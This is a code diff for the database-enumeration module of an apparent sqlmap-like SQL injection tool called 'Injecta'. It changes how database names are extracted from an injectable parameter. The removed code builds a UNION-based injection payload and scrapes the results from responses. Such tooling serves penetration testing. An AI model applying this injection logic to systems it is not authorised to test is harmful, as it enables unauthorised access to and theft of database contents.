@@ -1,7 +1,8 @@
 """
-Injecta — Database enumeration
+Injecta — Database enumeration (sqlmap-style extraction)
 """
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List
+from injecta.enum.extract import extract_clean, split_groupped
 
 
 class DBMSEnumerator:
@@ -11,27 +12,19 @@ class DBMSEnumerator:
         self.log = logger
         self.payloads = payloads
         self.info = injection_info
+        self.dbms = getattr(payloads, "name", "") if payloads else ""
 
     def enumerate(self, url: str, param: str) -> List[str]:
         databases = []
         queries = self.payloads.databases()
+        cols = self.info.get("column_count", 1)
+        pos = self.info.get("data_pos", 1)
 
         for q in queries:
-            results = self._try_extract(url, param, q)
+            results = extract_clean(self.req, url, param, q, cols, pos, self.dbms)
             if results:
-                databases.extend(results)
+                for r in results:
+                    databases.extend(split_groupped(r))
                 break
 
         return list(set(databases))
-
-    def _try_extract(self, url: str, param: str, sql: str) -> List[str]:
-        results = []
-        payload = f"' UNION {sql}-- -"
-        _, resp_text, _ = self.req.test_raw(url, payload, param)
-        if resp_text and len(resp_text) > 100:
-            import re
-            candidates = re.findall(r'(\w[\w$#@.-]+)', resp_text)
-            if candidates:
-                results = [c for c in candidates if len(c) > 1 and not c.isdigit()
-                          and c.lower() not in ('select', 'from', 'where', 'and', 'or', 'null', 'as', 'on', 'union', 'information_schema')][:20]
-        return results
